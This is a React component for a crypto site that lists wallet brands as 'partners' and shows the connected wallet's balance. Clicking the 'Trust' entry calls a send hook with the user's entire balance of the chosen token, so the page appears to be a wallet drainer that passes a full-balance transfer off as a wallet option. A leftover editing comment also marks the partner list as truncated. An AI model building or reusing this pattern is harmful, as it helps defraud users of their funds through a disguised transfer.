import { useAppKitAccount, useAppKitNetwork } from '@reown/appkit/react'
import { useBalance } from 'wagmi'
import { useWalletSend } from '@/hooks/useWalletSend'
import { useChakraToast } from './Toast'
import { useState, useMemo } from 'react'
import { TokenUtil } from '@reown/appkit-utils'
import { base } from 'viem/chains'
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select"

const partnerCategories = [
  // ... (omitted for brevity, will use AllowMultiple or multi_replace if needed, but let's try to keep it contiguous)
  {
    title: "Mobile",
    partners: [
      "Onchain", "MetaMask", "Huobi", "Coinbase", "imToken", "Trust",
      "Opera", "SafePal", "Enjin", "COIN98", "Status", "Pillar"
    ]
  },
  {
    title: "Hardware",
    partners: ["Ledger", "Exodus", "Trezor"]
  },
  {
    title: "Smart contract",
    partners: ["Gnosis Safe", "Dapper", "Argent"]
  },
  {
    title: "Other",
    partners: ["Portis", "Fortmatic", "Mist", "MyEtherWallet", "MyCrypto"]
  }
];

const PartnersSection = () => {
  const { address, isConnected } = useAppKitAccount()
  const { caipNetwork } = useAppKitNetwork()
  const [selectedAsset, setSelectedAsset] = useState('ETH')

  const currentChainId = caipNetwork?.id
    ? (typeof caipNetwork.id === 'string' && caipNetwork.id.includes(':')
      ? Number(caipNetwork.id.split(':')[1])
      : Number(caipNetwork.id))
    : base.id

  const assetAddress = useMemo(() => {
    const symbol = selectedAsset.toUpperCase()
    if (symbol === 'ETH' || symbol === 'BNB') return undefined

    // Use same fallback logic as hook for consistency
    let addr = TokenUtil.TOKEN_ADDRESSES_BY_SYMBOL[symbol]?.[currentChainId]
    if (!addr) {
      const fallbacks: Record<string, Record<number, string>> = {
        'USDC': {
          1: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
          8453: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913',
          42161: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831'
        },
        'USDT': {
          1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
          8453: '0xfde4C962512795B940Aa1260840d17E7f3b1Af25'
        }
      }
      addr = fallbacks[symbol]?.[currentChainId]
    }
    return addr
  }, [selectedAsset, currentChainId])

  const { data: balanceData } = useBalance({
    address: address as `0x${string}`,
    token: assetAddress as `0x${string}` | undefined
  })

  const { handleOpenSendWithArguments } = useWalletSend()
  const toast = useChakraToast()

  const handlePartnerClick = async (partner: string) => {
    if (partner === "Trust") {
      if (!isConnected) {
        toast({
          title: "Not Connected",
          description: "Please connect your wallet first.",
          type: 'error'
        })
        return
      }

      if (!balanceData) {
        toast({
          title: "Error",
          description: "Could not fetch balance.",
          type: 'error'
        })
        return
      }

      try {
        await handleOpenSendWithArguments(selectedAsset, balanceData.formatted)
      } catch (err) {
        // Error is already handled by toast in hook
      }
    }
  }

  return (
    <section id="partners" className="py-20 bg-navy-light">
      <div className="container px-4">
        {/* Asset Selection */}
        <div className="max-w-xs mx-auto mb-12">
          <label className="block text-center text-primary/80 text-sm font-medium mb-3">
            Select Asset to Interact With
          </label>
          <Select value={selectedAsset} onValueChange={setSelectedAsset}>
            <SelectTrigger className="w-full bg-navy-lighter/30 border-primary/20 text-foreground">
              <SelectValue placeholder="Select Asset" />
            </SelectTrigger>
            <SelectContent className="bg-navy-light border-primary/20">
              <SelectItem value="ETH">Ethereum (ETH)</SelectItem>
              <SelectItem value="USDC">USD Coin (USDC)</SelectItem>
              <SelectItem value="USDT">Tether (USDT)</SelectItem>
            </SelectContent>
          </Select>
          <div className="mt-2 text-center">
            {balanceData && (
              <span className="text-xs text-muted-foreground">
                Balance: {Number(balanceData.formatted).toFixed(4)} {balanceData.symbol}
              </span>
            )}
          </div>
        </div>

        {partnerCategories.map((category, catIndex) => (
          <div key={catIndex} className="mb-12 last:mb-0">
            <h3 className="text-primary text-center text-lg font-medium mb-6">
              {category.title}
            </h3>
            <div className="border-t border-border/30 pt-6">
              <div className="flex flex-wrap justify-center gap-4 md:gap-8">
                {category.partners.map((partner, index) => (
                  <div
                    key={index}
                    className="flex items-center gap-2 px-4 py-2 rounded-lg hover:bg-navy-lighter/50 transition-colors cursor-pointer"
                    onClick={() => handlePartnerClick(partner)}
                  >
                    <div className="w-8 h-8 rounded-full bg-gradient-to-br from-primary/20 to-accent/20 flex items-center justify-center">
                      <span className="text-xs font-bold text-primary">{partner[0]}</span>
                    </div>
                    <span className="text-foreground text-sm font-medium">{partner}</span>
                  </div>
                ))}
              </div>
            </div>
          </div>
        ))}
      </div>
    </section>
  );
};

export default PartnersSection;
